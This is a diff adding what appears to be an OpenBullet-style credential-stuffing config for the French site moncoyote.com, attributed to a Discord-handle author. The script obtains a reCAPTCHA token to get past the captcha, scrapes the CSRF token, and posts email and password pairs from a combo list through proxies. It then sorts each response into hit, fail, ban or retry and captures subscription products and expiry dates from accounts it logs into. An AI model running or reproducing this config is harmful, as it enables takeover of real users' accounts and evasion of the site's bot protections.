@@ -1,0 +1,112 @@
+[SETTINGS]
+{
+  "Name": "Moncoyotte.fr (France)",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-08T23:19:11.5096831+04:00",
+  "AdditionalInfo": "FR Combo | Any Proxy",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CONECT REQUEST GET "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfRRbAUAAAAACdCj-wxB5MInO_3g4aQqlJa0fO-&co=aHR0cHM6Ly93d3cubW9uY295b3RlLmNvbTo0NDM.&hl=fr&v=r8jtf1oixV0IGff4hgB4EzDF&size=invisible&cb=dvbgg2649idq" 
+  
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TK PARSE "<SOURCE>" LR "type=\"hidden\" id=\"recaptcha-token\" value=\"" "\"" -> VAR "TK" 
+
+#POST REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LfRRbAUAAAAACdCj-wxB5MInO_3g4aQqlJa0fO-" 
+  CONTENT "v=r8jtf1oixV0IGff4hgB4EzDF&reason=q&c=<TK>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7" 
+  HEADER "content-length: 5628" 
+  HEADER "origin: https://www.google.com" 
+  HEADER "referer: <ADDRESS>" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+
+#TR PARSE "<SOURCE>" LR "[\"rresp\",\"" "\"" -> VAR "TR" 
+
+REQUEST GET "https://www.moncoyote.com/fr/users/auth/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"CoyoteCSRF\" value=\"" "\"" -> VAR "csrf" 
+
+REQUEST POST "https://www.moncoyote.com/fr/users/auth" 
+  CONTENT "CoyoteCSRF=<csrf>&email=<USER>&password=<PASS>&captcha-token=<TK>&loginAccount=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 692" 
+  HEADER "Origin: https://www.moncoyote.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.moncoyote.com/fr/users/auth" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "\"/fr/users/auth/logout\">" 
+    KEY "<div class=\"h3 noMargin green p-b-1em\">" 
+  KEYCHAIN Failure OR 
+    KEY "Votre identifiant ou mot de passe est incorrect" 
+  KEYCHAIN Ban OR 
+    KEY "The Amazon CloudFront distribution is configured to block access from your country." 
+  KEYCHAIN Failure AND 
+    KEY "<i>Expir" 
+    KEY "<li><a href=\"/fr/users/auth/logout\">" 
+  KEYCHAIN Failure AND 
+    KEY "<li><a href=\"/fr/users/auth/logout\">" 
+    KEY "<SOURCE>" DoesNotContain "<div class=\"h3 noMargin green p-b-1em\">" 
+  KEYCHAIN Retry OR 
+    KEY "Veuillez renseigner le Captcha." 
+
+PARSE "<SOURCE>" LR "<div class=\"h3 noMargin green p-b-1em\">" "</div>" Recursive=TRUE -> CAP "Products" 
+
+PARSE "<SOURCE>" LR "abonnement : " " " Recursive=TRUE -> CAP "Date de fin d'abonnement" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "Date de fin d'abonnement" 
+    KEY "<li><a href=\"/fr/users/auth/logout\">" 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<li><a href=\"/fr/users/auth/logout\">" 
+    KEY "<SOURCE>" DoesNotContain "Date de fin d'abonnement" 
+
